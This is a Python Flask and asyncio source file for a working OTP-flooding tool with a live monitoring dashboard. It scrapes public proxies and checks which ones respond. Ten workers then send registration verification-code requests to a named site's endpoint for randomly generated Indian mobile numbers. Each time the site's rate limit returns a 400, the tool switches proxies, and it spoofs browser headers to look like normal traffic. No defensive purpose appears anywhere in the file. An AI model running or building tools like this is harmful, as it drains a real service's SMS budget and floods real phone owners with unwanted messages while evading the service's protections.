import asyncio
import aiohttp
import random
import time
import threading
import json
import datetime
from flask import Flask, jsonify, render_template_string, Response

app = Flask(__name__)

# --- GLOBAL STATE & QUEUES ---
STATE = {
    "start_time_unix": time.time(),
    "start_time_str": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
    "code_200": 0,
    "code_400": 0,
    "proxies_fetched": 0,
    "proxies_dead": 0,
    "proxies_live": 0,
    "logs": []
}

PROXIES_LIVE_QUEUE = []

# --- LOGGING HELPER ---
def log_sys(msg, level="info", mobile="N/A", proxy="N/A"):
    """Appends detailed logs to the state."""
    entry = {
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "message": msg,
        "level": level,
        "mobile": mobile,
        "proxy": proxy
    }
    STATE["logs"].insert(0, entry)
    # Cap logs in memory to 5000 to prevent RAM overflow on Render's 512MB free tier
    if len(STATE["logs"]) > 5000:
        STATE["logs"] = STATE["logs"][:5000]

# --- ASYNC BACKGROUND TASKS ---
async def fetch_and_check_proxies(session):
    """Fetch 500 proxies and verify which ones are live."""
    log_sys("SYSTEM: Initiating fetch for 500 global proxies...", "system")
    
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
    try:
        async with session.get(url) as resp:
            text = await resp.text()
            proxies = text.strip().split('\r\n')
            # Grab exactly 500 proxies
            proxies = proxies[:500] 
            STATE["proxies_fetched"] += len(proxies)
            log_sys(f"SYSTEM: Successfully downloaded {len(proxies)} proxies. Starting live checks...", "system")
            
            # Helper function to check a single proxy
            async def check_proxy(p):
                try:
                    # Test proxy against a fast, lightweight IP checker
                    proxy_url = f"http://{p}"
                    async with session.get("http://api.ipify.org/", proxy=proxy_url, timeout=5) as r:
                        if r.status == 200:
                            PROXIES_LIVE_QUEUE.append(p)
                            STATE["proxies_live"] += 1
                            log_sys(f"PROXY VALIDATED: {p} is LIVE.", "success", proxy=p)
                        else:
                            STATE["proxies_dead"] += 1
                            log_sys(f"PROXY REJECTED: {p} returned status {r.status}.", "error", proxy=p)
                except Exception:
                    STATE["proxies_dead"] += 1
                    log_sys(f"PROXY DEAD: {p} connection timeout/failed.", "error", proxy=p)

            # Check proxies concurrently in batches of 50 to avoid socket exhaustion
            chunk_size = 50
            for i in range(0, len(proxies), chunk_size):
                tasks = [check_proxy(p) for p in proxies[i:i+chunk_size]]
                await asyncio.gather(*tasks)
                
            log_sys(f"SYSTEM: Proxy batch check complete. Current Live Queue: {len(PROXIES_LIVE_QUEUE)}", "system")
            
    except Exception as e:
        log_sys(f"SYSTEM ERROR: Failed to fetch proxies from API. {str(e)}", "error")

async def otp_worker(session, worker_id):
    """Worker that grabs a live proxy and loops OTPs until hitting 400."""
    global PROXIES_LIVE_QUEUE
    
    while True:
        # Wait if no proxies are available
        if not PROXIES_LIVE_QUEUE:
            await asyncio.sleep(2)
            continue
            
        # 1. Grab a live proxy
        current_proxy = PROXIES_LIVE_QUEUE.pop(0)
        STATE["proxies_live"] -= 1
        log_sys(f"[WORKER-{worker_id}] Acquired live proxy. Initiating OTP loop.", "system", proxy=current_proxy)
        proxy_url = f"http://{current_proxy}"
        
        # 2. Loop continuously on this proxy
        while True:
            # Generate random 10-digit Indian mobile number
            mobile = "+91" + random.choice("6789") + "".join(random.choices("0123456789", k=9))
            payload = {"mobile_number": mobile, "verify_type": "register"}
            headers = {
                "Origin": "https://cooe03.in",
                "Referer": "https://cooe03.in/",
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.{worker_id} Safari/537.36",
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*"
            }

            log_sys(f"[WORKER-{worker_id}] Sending OTP request...", "info", mobile=mobile, proxy=current_proxy)

            try:
                # 3. Send Request
                async with session.post("https://cooe03.in/user/send_verify_code", json=payload, headers=headers, proxy=proxy_url, timeout=12) as resp:
                    try:
                        data = await resp.json()
                        code = data.get("code", resp.status)
                    except:
                        code = resp.status
                    
                    # 4. Handle Response
                    if code == 200:
                        STATE["code_200"] += 1
                        log_sys(f"[WORKER-{worker_id}] CODE 200: OTP successfully sent.", "success", mobile=mobile, proxy=current_proxy)
                        await asyncio.sleep(1) # Slight delay before reusing the proxy
                        continue # Keep using the same proxy
                        
                    elif code == 400:
                        STATE["code_400"] += 1
                        log_sys(f"[WORKER-{worker_id}] CODE 400: IP limit reached. Discarding proxy.", "warn", mobile=mobile, proxy=current_proxy)
                        break # Break inner loop, discard proxy, get a new one
                        
                    else:
                        log_sys(f"[WORKER-{worker_id}] CODE {code}: Unexpected response. Discarding proxy.", "error", mobile=mobile, proxy=current_proxy)
                        break # Break inner loop
            
            except Exception as e:
                log_sys(f"[WORKER-{worker_id}] CONNECTION LOST: Proxy died during request. Discarding.", "error", mobile=mobile, proxy=current_proxy)
                break # Break inner loop

async def proxy_manager(session):
    """Background task to ensure we always have live proxies."""
    while True:
        if len(PROXIES_LIVE_QUEUE) < 15:
            await fetch_and_check_proxies(session)
        await asyncio.sleep(10)

async def master_async_loop():
    """Starts the proxy manager and the 10 simultaneous workers."""
    async with aiohttp.ClientSession() as session:
        # Start Proxy Manager
        manager_task = asyncio.create_task(proxy_manager(session))
        
        # Start 10 Simultaneous Workers
        workers = [asyncio.create_task(otp_worker(session, i)) for i in range(1, 11)]
        
        await asyncio.gather(manager_task, *workers)

def start_background_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()


# --- FLASK ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def stats():
    uptime_seconds = int(time.time() - STATE["start_time_unix"])
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "uptime": f"{hours:02d}h {minutes:02d}m {seconds:02d}s",
        "started_at": STATE["start_time_str"],
        "code_200": STATE["code_200"],
        "code_400": STATE["code_400"],
        "proxies_fetched": STATE["proxies_fetched"],
        "proxies_dead": STATE["proxies_dead"],
        "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
        "logs": STATE["logs"][:100] # Send only the latest 100 logs to the UI
    })

@app.route('/api/export')
def export_data():
    """Export all stored logs as JSON."""
    def generate():
        yield json.dumps({
            "export_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "statistics": {
                "total_200": STATE["code_200"],
                "total_400": STATE["code_400"],
                "proxies_fetched": STATE["proxies_fetched"],
                "proxies_dead": STATE["proxies_dead"]
            },
            "activity_logs": STATE["logs"]
        }, indent=4)
    return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=otp_traffic_logs.json'})


# --- UI TEMPLATE (Cyber Hacker Vibe) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYS.TERMINAL // TRAFFIC ROUTER</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            text-shadow: 0 0 10px #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            letter-spacing: 2px;
        }
        .header-info {
            text-align: center;
            margin-bottom: 20px;
            color: #00ffff;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .stat-box {
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            background: rgba(0, 255, 0, 0.03);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
        }
        .stat-value {
            font-size: 26px;
            font-weight: bold;
            margin-top: 10px;
            text-shadow: 0 0 5px #00ff00;
        }
        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); background: rgba(255, 51, 51, 0.03);}
        .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
        
        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); background: rgba(0, 255, 255, 0.03);}
        .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }

        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); background: rgba(136, 136, 136, 0.03);}
        .box-gray .stat-value { text-shadow: 0 0 5px #888; }

        .terminal-container {
            margin-top: 20px;
            background: #000;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
            padding: 15px;
            height: 500px;
            overflow-y: auto;
        }
        .log-row {
            margin-bottom: 5px;
            line-height: 1.4;
            font-size: 14px;
        }
        .level-system { color: #00ffff; }
        .level-success { color: #00ff00; }
        .level-error { color: #ff3333; }
        .level-warn { color: #ffcc00; }
        .level-info { color: #ffffff; }
        
        .btn-export {
            display: block;
            width: 100%;
            padding: 15px;
            background: #002200;
            color: #00ff00;
            border: 1px solid #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: 0.3s;
            box-sizing: border-box;
        }
        .btn-export:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #050505; border-left: 1px solid #00ff00; }
        ::-webkit-scrollbar-thumb { background: #00ff00; }
    </style>
</head>
<body>

    <h1>[ SYS.TERMINAL // PROXY-OTP ROUTER ]</h1>
    <div class="header-info">
        SERVER STARTED: <span id="val_started">--</span> | UPTIME: <span id="val_uptime">--</span>
    </div>

    <div class="stats-grid">
        <div class="stat-box box-cyan">
            <div>PROXIES FETCHED</div>
            <div class="stat-value" id="val_fetched">0</div>
        </div>
        <div class="stat-box">
            <div>PROXIES LIVE QUEUE</div>
            <div class="stat-value" id="val_live">0</div>
        </div>
        <div class="stat-box box-gray">
            <div>PROXIES DEAD</div>
            <div class="stat-value" id="val_dead">0</div>
        </div>
        <div class="stat-box">
            <div>CODE 200 (SUCCESS)</div>
            <div class="stat-value" id="val_200">0</div>
        </div>
        <div class="stat-box box-red">
            <div>CODE 400 (LIMIT HIT)</div>
            <div class="stat-value" id="val_400">0</div>
        </div>
    </div>

    <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>

    <div class="terminal-container" id="terminal">
        <!-- Logs injected here via JS -->
    </div>

    <script>
        function fetchStats() {
            fetch('/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('val_uptime').innerText = data.uptime;
                    document.getElementById('val_started').innerText = data.started_at;
                    document.getElementById('val_fetched').innerText = data.proxies_fetched;
                    document.getElementById('val_live').innerText = data.proxies_live_queue;
                    document.getElementById('val_dead').innerText = data.proxies_dead;
                    document.getElementById('val_200').innerText = data.code_200;
                    document.getElementById('val_400').innerText = data.code_400;

                    const terminal = document.getElementById('terminal');
                    terminal.innerHTML = ''; // Clear and re-render
                    
                    data.logs.forEach(log => {
                        const div = document.createElement('div');
                        div.className = `log-row level-${log.level}`;
                        div.innerText = `[${log.time}] ${log.message} | TGT: ${log.mobile} | PRX: ${log.proxy}`;
                        terminal.appendChild(div);
                    });
                })
                .catch(err => console.error("Sync Error:", err));
        }

        // Poll API every 1 second
        setInterval(fetchStats, 1000);
        fetchStats();
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    import os
    
    # 1. Start Async Loop in Background Thread
    loop = asyncio.new_event_loop()
    t = threading.Thread(target=start_background_loop, args=(loop,), daemon=True)
    t.start()
    asyncio.run_coroutine_threadsafe(master_async_loop(), loop)

    # 2. Start Flask Server (Render dynamically assigns a PORT)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
